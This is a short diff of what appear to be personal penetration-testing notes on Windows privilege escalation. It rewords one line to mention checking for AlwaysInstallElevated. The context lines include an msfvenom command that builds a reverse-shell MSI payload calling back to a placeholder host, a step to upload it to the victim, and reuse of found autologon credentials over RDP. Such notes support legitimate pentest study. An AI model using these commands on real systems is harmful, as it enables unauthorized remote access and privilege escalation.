@@ -618,7 +618,7 @@ Privelege Escalation:
 	Windows:
 		- Using winpeas, if the machineis vulnerable to autologon: 
 			- Use credentials to RDP 
-		- Use winpeas:
+		- Use winpeas to check for AlwaysInstallElevated privilege:
 			- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f
 msi -o reverse_shell.msi
 			- upload the payload to the victim 
